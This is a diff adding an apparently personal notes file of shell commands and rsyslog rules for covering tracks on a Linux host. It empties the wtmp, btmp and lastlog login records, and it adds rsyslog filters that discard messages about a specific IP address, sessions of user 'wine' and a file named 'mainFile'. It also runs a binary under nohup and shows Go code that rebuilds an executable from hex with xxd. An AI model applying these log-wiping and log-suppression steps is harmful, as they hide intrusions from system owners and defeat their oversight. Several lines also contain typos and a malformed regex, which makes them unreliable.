@@ -1,0 +1,51 @@
+var/run/utmp -> holds the current login data accessed with w or who
+var/log/btwp -> holds the bad ssh connections
+var/log/lastlog -> holds the "lastlog" data 
+var/log/wtmp -> holds the "last" data
+
+
+
+echo > /var/log/wtmp
+
+
+echo > /var/log/btmp
+
+
+echo > /var/log/lastlog
+
+
+sudo nohup ./main   
+
+
+
+scp wine@192.168.23.89:/home/wine/Desktop/L.zip /home/ubuntu/go/src/test/
+
+scp ubuntu@192.168.23.61:/home/ubuntu/go/src/test/config.toml /tmp/
+scp ubuntu@192.168.23.61:/home/ubuntu/go/src/test/main /tmp/
+
+
+command := fmt.Sprintf("echo -n %s >> hex.txt && xxd -r -p hex.txt > output_executable", j)
+
+
+sudo nano /etc/rsyslog.d/50-default.conf
+
+sed -i 's/foo/bar/g' file.txt
+
+auth,authpriv.*                 /var/log/auth.log
+
+
+
+if ($msg contains "192.168.23.61" or $msg contains "Session" or $msg contains "Removed session" or $msg contains "session opened for user wine" or $msg contains "session closed for user wine" or $msg contains "of user wine." or $msg contains "mainFile" ) then stop
+
+
+
+$msg =~ /New session \d+/ of user wine/
+
+
+
+
+
+if ($msg contains "192.168.23.61" or $msg contains "session opened for user wine" or $msg contain "of user wine" 
+or $msg contains "session closed for user wine" or $msg contains "logged out." or $msg contains "Removed session") then stop
+
+
